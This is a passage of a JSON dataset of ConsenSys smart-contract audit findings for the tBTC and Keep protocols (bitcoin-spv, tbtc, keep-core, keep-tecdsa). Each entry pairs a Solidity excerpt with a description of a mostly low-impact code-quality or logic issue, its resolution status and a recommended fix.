      "content": "#### Resolution\n\n\n\nSumma opted not to make this change. See <https://github.com/summa-tx/bitcoin-spv/issues/116> for details.\n\n\n#### Description\n\n\nThe library exposes redundant implementations of bitcoins double `sha256`.\n\n\n#### Examples\n\n\n* solidity native implementation with an overzealous type correction [issue 5.45](#bitcoin-spv---unnecessary-type-correction)\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L110-L116**\n\n\n\n```\n/// @notice Implements bitcoin's hash256 (double sha2)\n/// @dev abi.encodePacked changes the return to bytes instead of bytes32\n/// @param \\_b The pre-image\n/// @return The digest\nfunction hash256(bytes memory \\_b) internal pure returns (bytes32) {\n    return abi.encodePacked(sha256(abi.encodePacked(sha256(\\_b)))).toBytes32();\n}\n\n```\n* assembly implementation\n\n\n**Note** this implementation does not handle errors when staticcall’ing the precompiled `sha256` contract (private chains).\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L118-L129**\n\n\n\n```\n/// @notice Implements bitcoin's hash256 (double sha2)\n/// @dev sha2 is precompiled smart contract located at address(2)\n/// @param \\_b The pre-image\n/// @return The digest\nfunction hash256View(bytes memory \\_b) internal view returns (bytes32 res) {\n    assembly {\n        let ptr := mload(0x40)\n        pop(staticcall(gas, 2, add(\\_b, 32), mload(\\_b), ptr, 32))\n        pop(staticcall(gas, 2, ptr, 32, ptr, 32))\n        res := mload(ptr)\n    }\n}\n\n```\n#### Recommendation\n\n\nWe recommend providing only one implementation for calculating the double `sha256` as maintaining two interfaces for the same functionality is not desirable. Furthermore, even though the assembly implementation is saving gas, we recommend keeping the language provided implementation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13804",
      "title": "bitcoin-spv - unnecessary logic in BytesLib.toBytes32() ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [summa-tx/bitcoin-spv#125](https://github.com/summa-tx/bitcoin-spv/pull/125)\n\n\n#### Description\n\n\nThe heavily used library function `BytesLib.toBytes32()` unnecessarily casts `_source` to `bytes` (same type) and creates a copy of the dynamic byte array to check it’s length, while this can be done directly on the user-provided `bytes _source`.\n\n\n#### Examples\n\n\n**bitcoin-spv/solidity/contracts/BytesLib.sol:L399-L408**\n\n\n\n```\nfunction toBytes32(bytes memory \\_source) pure internal returns (bytes32 result) {\n    bytes memory tempEmptyStringTest = bytes(\\_source);\n    if (tempEmptyStringTest.length == 0) {\n        return 0x0;\n    }\n\n    assembly {\n        result := mload(add(\\_source, 32))\n    }\n}\n\n```\n#### Recommendation\n\n\n\n```\nfunction toBytes32(bytes memory \\_source) pure internal returns (bytes32 result) {\n        if (\\_source.length == 0) {\n            return 0x0;\n        }\n\n        assembly {\n            result := mload(add(\\_source, 32))\n        }\n    }\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13803",
      "title": "bitcoin-spv - unnecessary intermediate cast ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [summa-tx/bitcoin-spv#123](https://github.com/summa-tx/bitcoin-spv/pull/123)\n\n\n#### Description\n\n\n`CheckBitcoinSigs.accountFromPubkey()` casts the `bytes32` keccack256 hash of the `pubkey` to `uint256`, then `uint160` and then finally to `address` while the intermediate cast is not required.\n\n\n#### Examples\n\n\n**bitcoin-spv/solidity/contracts/CheckBitcoinSigs.sol:L15-L25**\n\n\n\n```\n/// @notice Derives an Ethereum Account address from a pubkey\n/// @dev The address is the last 20 bytes of the keccak256 of the address\n/// @param \\_pubkey The public key X & Y. Unprefixed, as a 64-byte array\n/// @return The account address\nfunction accountFromPubkey(bytes memory \\_pubkey) internal pure returns (address) {\n    require(\\_pubkey.length == 64, \"Pubkey must be 64-byte raw, uncompressed key.\");\n\n    // keccak hash of uncompressed unprefixed pubkey\n    bytes32 \\_digest = keccak256(\\_pubkey);\n    return address(uint160(uint256(\\_digest)));\n}\n\n```\n#### Recommendation\n\n\nThe intermediate cast from `uint256` to `uint160` can be omitted. Refactor to `return address(uint256(_digest))` instead.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13802",
      "title": "bitcoin-spv - ValidateSPV.validateHeaderChain does not completely validate input  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nSumma opted not to make this change. See <https://github.com/summa-tx/bitcoin-spv/issues/111>\n\n\n#### Description\n\n\n`ValidateSPV.validateHeaderChain` takes as input a sequence of Bitcoin headers and calculates the total accumulated difficulty across the entire sequence. The input headers are checked to ensure they are relatively well-formed:\n\n\n**bitcoin-spv/solidity/contracts/ValidateSPV.sol:L173-L174**\n\n\n\n```\n// Check header chain length\nif (\\_headers.length % 80 != 0) {return ERR\\_BAD\\_LENGTH;}\n\n```\nHowever, the function lacks a check for nonzero length of `_headers`. Although the total difficulty returned would be zero, an explicit check would make this more clear.\n\n\n#### Recommendation\n\n\nIf `headers.length` is zero, return `ERR_BAD_LENGTH`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13801",
      "title": "bitcoin-spv - Unnecessary memory allocation in BTCUtils  Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe client provided feedback that this issue is not scheduled to be addressed.\n\n\n#### Description\n\n\n`BTCUtils` makes liberal use of `BytesLib.slice`, which returns a freshly-allocated slice of an existing bytes array. In many cases, the desired behavior is simply to read a 32-byte slice of a byte array. As a result, the typical pattern used is: `bytesVar.slice(start, start + 32).toBytes32()`.\n\n\nThis pattern introduces unnecessary complexity and memory allocation in a critically important library: cloning a portion of the array, storing that clone in memory, and then reading it from memory. A simpler alternative would be to implement `BytesLib.readBytes32(bytes _b, uint _idx)` and other “memory-read” functions.\n\n\nRather than moving the free memory pointer and redundantly reading, storing, then re-reading memory, `readBytes32` and similar functions would perform a simple length check and `mload` directly from the desired index in the array.\n\n\n#### Examples\n\n\n`extractInputTxIdLE`:\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L254-L260**\n\n\n\n```\n/// @notice Extracts the outpoint tx id from an input\n/// @dev 32 byte tx id\n/// @param \\_input The input\n/// @return The tx id (little-endian bytes)\nfunction extractInputTxIdLE(bytes memory \\_input) internal pure returns (bytes32) {\n    return \\_input.slice(0, 32).toBytes32();\n}\n\n```\n`verifyHash256Merkle`:\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L574-L586**\n\n\n\n```\nuint \\_idx = \\_index;\nbytes32 \\_root = \\_proof.slice(\\_proof.length - 32, 32).toBytes32();\nbytes32 \\_current = \\_proof.slice(0, 32).toBytes32();\n\nfor (uint i = 1; i < (\\_proof.length.div(32)) - 1; i++) {\n    if (\\_idx % 2 == 1) {\n        \\_current = \\_hash256MerkleStep(\\_proof.slice(i \\* 32, 32), abi.encodePacked(\\_current));\n    } else {\n        \\_current = \\_hash256MerkleStep(abi.encodePacked(\\_current), \\_proof.slice(i \\* 32, 32));\n    }\n    \\_idx = \\_idx >> 1;\n}\nreturn \\_current == \\_root;\n\n```\n#### Recommendation\n\n\nImplement `BytesLib.readBytes32` and favor its use over the `bytesVar.slice(start, start + 32).toBytes32()` pattern. Implement other memory-read functions where possible, and avoid the use of `slice`.\n\n\nNote, too, that implementing this change in `verifyHash256Merkle` would allow `_hash256MerkleStep` to accept 2 `bytes32` inputs (rather than `bytes`), removing additional unnecessary casting and memory allocation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13800",
      "title": "tbtc - approveAndCall unused return parameter ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/505> by returning `true` instead of `false`.\n\n\n#### Description\n\n\n`approveAndCall` always returns false because the return value `bool success` is never set.\n\n\n#### Examples\n\n\n**tbtc/implementation/contracts/system/TBTCDepositToken.sol:L42-L54**\n\n\n\n```\n/// @notice Set allowance for other address and notify.\n/// Allows `\\_spender` to transfer the specified TDT\n/// on your behalf and then ping the contract about it.\n/// @dev The `\\_spender` should implement the `tokenRecipient` interface below\n/// to receive approval notifications.\n/// @param \\_spender Address of contract authorized to spend.\n/// @param \\_tdtId The TDT they can spend.\n/// @param \\_extraData Extra information to send to the approved contract.\nfunction approveAndCall(address \\_spender, uint256 \\_tdtId, bytes memory \\_extraData) public returns (bool success) {\n    tokenRecipient spender = tokenRecipient(\\_spender);\n    approve(\\_spender, \\_tdtId);\n    spender.receiveApproval(msg.sender, \\_tdtId, address(this), \\_extraData);\n}\n\n```\n#### Recommendation\n\n\nReturn the correct success state.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13799",
      "title": "tbtc - liquidating a deposit does not send the complete remainder of the contract balance to recipients ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/504> and commits from <https://github.com/keep-network/tbtc/pull/524,> transferring the remaining balance of the contract to the initiator and switching from `transfer` which might block the auction to `send`. We’d like to note that in case the `send` fails funds might be locked in the contract.\n\n\n#### Description\n\n\n`purchaseSignerBondsAtAuction` might leave a wei in the contract if:\n\n\n* there is only one wei remaining in the contract\n* there is more than one wei remaining but the contract balance is odd.\n\n\n#### Examples\n\n\n* contract balances must be > 1 wei otherwise no transfer is attempted\n* the division at line 271 floors the result if dividing an odd balance. The contract is sending `floor(contract.balance / 2)` to the keep group and liquidationInitiator leaving one 1 in the contract.\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L266-L275**\n\n\n\n```\nif (contractEthBalance > 1) {\n    if (\\_wasFraud) {\n        initiator.transfer(contractEthBalance);\n    } else {\n        // There will always be a liquidation initiator.\n        uint256 split = contractEthBalance.div(2);\n        \\_d.pushFundsToKeepGroup(split);\n        initiator.transfer(split);\n    }\n}\n\n```\n#### Recommendation\n\n\nDefine a reasonable minimum amount when awarding the fraud reporter or liquidation initiator. Alternatively, always transfer the contract balance. When splitting the amount use the contract balance after the first transfer as the value being sent to the second recipient. Use the presence of locked funds in a contract as an error indicator unless funds were sent forcefully to the contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13798",
      "title": "tbtc - Signer collusion may bypass increaseRedemptionFee flow ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#522](https://github.com/keep-network/tbtc/pull/522)\n\n\n#### Description\n\n\nDepositRedemption.increaseRedemptionFee is used by signers to approve a signable bitcoin transaction with a higher fee, in case the network is congested and miners are not approving the lower-fee transaction.\n\n\nFee increases can be performed every 4 hours:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L225**\n\n\n\n```\nrequire(block.timestamp >= \\_d.withdrawalRequestTime + TBTCConstants.getIncreaseFeeTimer(), \"Fee increase not yet permitted\");\n\n```\nIn addition, each increase must increment the fee by exactly the initial proposed fee:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L260-L263**\n\n\n\n```\n// Check that we're incrementing the fee by exactly the redeemer's initial fee\nuint256 \\_previousOutputValue = DepositUtils.bytes8LEToUint(\\_previousOutputValueBytes);\n\\_newOutputValue = DepositUtils.bytes8LEToUint(\\_newOutputValueBytes);\nrequire(\\_previousOutputValue.sub(\\_newOutputValue) == \\_d.initialRedemptionFee, \"Not an allowed fee step\");\n\n```\nOutside of these two restrictions, there is no limit to the number of times `increaseRedemptionFee` can be called. Over a 20-hour period, for example, `increaseRedemptionFee` could be called 5 times, increasing the fee to `initialRedemptionFee * 5`.\n\n\nRather than calling `increaseRedemptionFee` 5 times over 20 hours, colluding signers may immediately create and sign a transaction with a fee of `initialRedemptionFee * 5`, wait for it to be mined, then submit it to `provideRedemptionProof`. Because `provideRedemptionProof` does not check that a transaction signature signs an approved digest, interested parties would need to monitor the bitcoin blockchain, notice the spend, and provide an ECDSA fraud proof before `provideRedemptionProof` is called.\n\n\n#### Recommendation\n\n\nTrack the latest approved fee, and ensure the transaction in `provideRedemptionProof` does not include a higher fee.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13797",
      "title": "keep-core - TokenStaking owner should be protected from slash() and seize() during initializationPeriod ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed by <https://github.com/keep-network/keep-core/issues/1426> and fixed with [keep-network/keep-core#1453](https://github.com/keep-network/keep-core/pull/1453).\n\n\n#### Description\n\n\nFrom the [specification](http://docs.keep.network/random-beacon/#_staking):\n\n\n\n> \n> Slashing\n> If a staker violates the protocol of an operation in a way which can be proven on-chain, they will be penalized by having their stakes slashed.\n> \n> \n> \n\n\nThe initialization period is a backoff time during which operator stakes are not active nor eligible to receive work. Since they cannot misbehave they should be protected from having their stake slashed or seized.\n\n\nIt should also be noted that `slash()` and `seize()` can be front-run during the initializationPeriod by having the operator owner cancel the deposit before it is being slashed or seized.\n\n\n#### Recommendation\n\n\nRequire deposits to be in active state for being slashed or seized.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13796",
      "title": "keep-tecdsa - withdraw should check for zero value transfer ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-tecdsa/issues/280> by denying zero value withdrawals.\n\n\n#### Description\n\n\nRequesting the withdrawal of zero `ETH` in `KeepBonding.withdraw` should fail as this would allow the method to succeed, calling the user-provided destination even though the sender has no unbonded value.\n\n\n#### Examples\n\n\n**keep-tecdsa/solidity/contracts/KeepBonding.sol:L78-L88**\n\n\n\n```\nfunction withdraw(uint256 amount, address payable destination) public {\n    require(\n        unbondedValue[msg.sender] >= amount,\n        \"Insufficient unbonded value\"\n    );\n\n    unbondedValue[msg.sender] -= amount;\n\n    (bool success, ) = destination.call.value(amount)(\"\");\n    require(success, \"Transfer failed\");\n}\n\n```\nAnd a similar instance in `BondedECDSAKeep`:\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeep.sol:L487-L498**\n\n\n\n```\n/// @notice Withdraws amount of ether hold in the keep for the member.\n/// The value is sent to the beneficiary of the specific member.\n/// @param \\_member Keep member address.\nfunction withdraw(address \\_member) external {\n    uint256 value = memberETHBalances[\\_member];\n    memberETHBalances[\\_member] = 0;\n\n    /\\* solium-disable-next-line security/no-call-value \\*/\n    (bool success, ) = tokenStaking.magpieOf(\\_member).call.value(value)(\"\");\n\n    require(success, \"Transfer failed\");\n}\n\n```\n#### Recommendation\n\n\nRequire that the amount to be withdrawn is greater than zero.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13795",
      "title": "tbtc - Remove notifyDepositExpiryCourtesyCall and allow exitCourtesyCall exiting the courtesy call at term ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with [keep-network/tbtc#476](https://github.com/keep-network/tbtc/pull/476) following the recommendation.\n\n\n#### Description\n\n\nFollowing a deep dive into state transitions with the client it was agreed that `notifyDepositExpiryCourtesyCall` should be removed from the system as it is a left-over of a previous version of the deposit contract.\n\n\nAdditionally, `exitCourtesyCall` should be callable at any time.\n\n\n#### Examples\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L289-L298**\n\n\n\n```\n/// @notice Goes from courtesy call to active\n/// @dev Only callable if collateral is sufficient and the deposit is not expiring\n/// @param \\_d deposit storage pointer\nfunction exitCourtesyCall(DepositUtils.Deposit storage \\_d) public {\n    require(\\_d.inCourtesyCall(), \"Not currently in courtesy call\");\n    require(block.timestamp <= \\_d.fundedAt + TBTCConstants.getDepositTerm(), \"Deposit is expiring\");\n    require(getCollateralizationPercentage(\\_d) >= \\_d.undercollateralizedThresholdPercent, \"Deposit is still undercollateralized\");\n    \\_d.setActive();\n    \\_d.logExitedCourtesyCall();\n}\n\n```\n#### Recommendation\n\n\nRemove the `notifyDepositExpiryCourtesyCall` state transition and remove the requirement on `exitCourtesyCall` being callable only before the deposit expires.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13794",
      "title": "keep-core - Specification inconsistency: TokenStaking.slash() is never called ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-tecdsa/issues/254> and changesets from [keep-network/keep-tecdsa#283](https://github.com/keep-network/keep-tecdsa/pull/283) by slashing the signer stakes when signature fraud is proven.\n\n\n#### Description\n\n\nAccording to the [keep specification](http://docs.keep.network/random-beacon/#_slashing) stake should be slashed if a staker violates the protocol:\n\n\n\n> \n> Slashing\n> If a staker violates the protocol of an operation in a way which can be proven on-chain, they will be penalized by having their stakes slashed.\n> \n> \n> \n\n\nWhile this functionality can only be called by the approved operator contract, it is not being used throughout the system. In contrast `seize()` is being called when reporting unauthorized signing or relay entry timeout.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L151-L167**\n\n\n\n```\n/\\*\\*\n \\* @dev Slash provided token amount from every member in the misbehaved\n \\* operators array and burn 100% of all the tokens.\n \\* @param amount Token amount to slash from every misbehaved operator.\n \\* @param misbehavedOperators Array of addresses to seize the tokens from.\n \\*/\nfunction slash(uint256 amount, address[] memory misbehavedOperators)\n    public\n    onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], \"Not authorized\");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    token.burn(misbehavedOperators.length.mul(amount));\n}\n\n```\n#### Recommendation\n\n\nImplement slashing according to the specification.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13793",
      "title": "keep-tecdsa - Change state-mutability of checkSignatureFraud to view ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed as part of <https://github.com/keep-network/keep-tecdsa/issues/254> with commits from [keep-network/keep-tecdsa#283](https://github.com/keep-network/keep-tecdsa/pull/283) splitting the method into two parts: `checkSignatureFraud` declared `view-only` and `submitSignatureFraud` which initiates slashing of signer stakes.\n\n\n#### Description\n\n\n`BondedECDSAKeep.sol.submitSignatureFraud` is not state-changing and should, therefore, be declared with the function state-mutability `view`.\n\n\n#### Examples\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeep.sol:L265-L290**\n\n\n\n```\nfunction submitSignatureFraud(\n    uint8 \\_v,\n    bytes32 \\_r,\n    bytes32 \\_s,\n    bytes32 \\_signedDigest,\n    bytes calldata \\_preimage\n) external returns (bool \\_isFraud) {\n    require(publicKey.length != 0, \"Public key was not set yet\");\n\n    bytes32 calculatedDigest = sha256(\\_preimage);\n    require(\n        \\_signedDigest == calculatedDigest,\n        \"Signed digest does not match double sha256 hash of the preimage\"\n    );\n\n    bool isSignatureValid = publicKeyToAddress(publicKey) ==\n        ecrecover(\\_signedDigest, \\_v, \\_r, \\_s);\n\n    // Check if the signature is valid but was not requested.\n    require(\n        isSignatureValid && !digests[\\_signedDigest],\n        \"Signature is not fraudulent\"\n    );\n\n    return true;\n}\n\n```\n#### Recommendation\n\n\nDeclare method as `view`. Consider renaming `submitSignatureFraud` to e.g. `checkSignatureFraud` to emphasize that it is only checking the signature and not actually changing state.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13792",
      "title": "keep-core - Specification inconsistency: TokenStaking amount to be slashed/seized ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nPartially addressed with <https://github.com/keep-network/keep-core/issues/1428> by ensuring that at least some stack is slashed. As noted in the issue, the case where less than the minimum stake was slashed from an operator is left unhandled with this fix.\n\n\n#### Description\n\n\n[The keep specification](http://docs.keep.network/random-beacon/#_staking_contract_slashing) states that `slash` and `seize` affect at least the amount specified or the remaining stake of a member.\n\n\n\n> \n> Slash each operator in the list misbehavers by the specified amount (or their remaining stake, whichever is lower).\n> \n> \n> \n\n\n\n> \n> Punish each operator in the list misbehavers by the specified amount or their remaining stake.\n> \n> \n> \n\n\nThe implementation, however, bails if one of the accounts does not have enough stake to be slashed or seized because of the use of `SafeMath.sub()`. This behavior is inconsistent with the specification which states that `min(amount, misbehaver.stake)` stake should be affected. The call to slash/seize will revert and no stakes are affected. At max, the staked amount of the lowest staker can be slashed/seized from every staker.\n\n\nImplementing this method as stated in the specification using `min(amount, misbehaver.stake)` will cover the fact that slashing/seizing was only partially successful. If `misbehaver.stake` is zero no error might be emitted even though no stake was slashed/seized.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L151-L195**\n\n\n\n```\n/\\*\\*\n \\* @dev Slash provided token amount from every member in the misbehaved\n \\* operators array and burn 100% of all the tokens.\n \\* @param amount Token amount to slash from every misbehaved operator.\n \\* @param misbehavedOperators Array of addresses to seize the tokens from.\n \\*/\nfunction slash(uint256 amount, address[] memory misbehavedOperators)\n    public\n    onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], \"Not authorized\");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    token.burn(misbehavedOperators.length.mul(amount));\n}\n\n/\\*\\*\n \\* @dev Seize provided token amount from every member in the misbehaved\n \\* operators array. The tattletale is rewarded with 5% of the total seized\n \\* amount scaled by the reward adjustment parameter and the rest 95% is burned.\n \\* @param amount Token amount to seize from every misbehaved operator.\n \\* @param rewardMultiplier Reward adjustment in percentage. Min 1% and 100% max.\n \\* @param tattletale Address to receive the 5% reward.\n \\* @param misbehavedOperators Array of addresses to seize the tokens from.\n \\*/\nfunction seize(\n    uint256 amount,\n    uint256 rewardMultiplier,\n    address tattletale,\n    address[] memory misbehavedOperators\n) public onlyApprovedOperatorContract(msg.sender) {\n    for (uint i = 0; i < misbehavedOperators.length; i++) {\n        address operator = misbehavedOperators[i];\n        require(authorizations[msg.sender][operator], \"Not authorized\");\n        operators[operator].amount = operators[operator].amount.sub(amount);\n    }\n\n    uint256 total = misbehavedOperators.length.mul(amount);\n    uint256 tattletaleReward = (total.mul(5).div(100)).mul(rewardMultiplier).div(100);\n\n    token.transfer(tattletale, tattletaleReward);\n    token.burn(total.sub(tattletaleReward));\n}\n\n```\n#### Recommendation\n\n\nRequire that `minimumStake` has been provided and can be seized/slashed. Update the documentation to reflect the fact that the solution always seizes/slashes `minimumStake`. Ensure that stakers cannot cancel their stake while they are actively participating in the network.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13791",
      "title": "keep-core - stake operator should not be eligible if undelegatedAt is set ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-core/issues/1433> by enforcing that stake must be canceled in initialization period.\n\n\n\n> \n> undelegatedAt is intended to support undelegation in advance at any given time. Whether we do < or <= is not actually significant, as transaction reordering also means ability to include/not include transactions arbitrarily, but changing the check to operator.UndelegatedAt == 0 would ruin e.g. the use-case where Alice wants to delegate to Bob for 12 months. If we don’t currently need that use-case, the check can be simplified to == 0.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nAn operator’s stake should not be eligible if they stake an amount and immediately call `undelegate` in an attempt to indicate that they are going to recover their stake soon.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L232-L236**\n\n\n\n```\nbool notUndelegated = block.number <= operator.undelegatedAt || operator.undelegatedAt == 0;\n\nif (isAuthorized && isActive && notUndelegated) {\n    balance = operator.amount;\n}\n\n```\n#### Recommendation\n\n\nA stake that is entering undelegation is indicated by `operator.undelegatedAt` being non-zero. Change the `notUndelegated` check `block.number <= operator.undelegatedAt || operator.undelegatedAt == 0` to `operator.undelegatedAT == 0` as any value being set indicates that undelegation is in progress.\n\n\nEnforce that within the initialization period stake is canceled instead of being undelegated.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13790",
      "title": "bitcoin-spv - verifyHash256Merkle allows existence proofs for the same leaf in multiple locations in the tree  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSumma opted not to make this change, citing inconsistencies in Bitcoin’s merkle implementation. See <https://github.com/summa-tx/bitcoin-spv/issues/108> for details.\n\n\n#### Description\n\n\n`BTCUtils.verifyHash256Merkle` is used by `ValidateSPV.prove` to validate a transaction’s existence in a Bitcoin block. The function accepts as input a `_proof` and an `_index`. The `_proof` consists of, in order: the transaction hash, a list of intermediate nodes, and the merkle root.\n\n\nThe proof is performed iteratively, and uses the `_index` to determine whether the next proof element represents a “left branch” or a “right branch:”\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L574-L586**\n\n\n\n```\nuint \\_idx = \\_index;\nbytes32 \\_root = \\_proof.slice(\\_proof.length - 32, 32).toBytes32();\nbytes32 \\_current = \\_proof.slice(0, 32).toBytes32();\n\nfor (uint i = 1; i < (\\_proof.length.div(32)) - 1; i++) {\n    if (\\_idx % 2 == 1) {\n        \\_current = \\_hash256MerkleStep(\\_proof.slice(i \\* 32, 32), abi.encodePacked(\\_current));\n    } else {\n        \\_current = \\_hash256MerkleStep(abi.encodePacked(\\_current), \\_proof.slice(i \\* 32, 32));\n    }\n    \\_idx = \\_idx >> 1;\n}\nreturn \\_current == \\_root;\n\n```\nIf `_idx` is even, the computed hash is placed before the next proof element. If `_idx` is odd, the computed hash is placed after the next proof element. 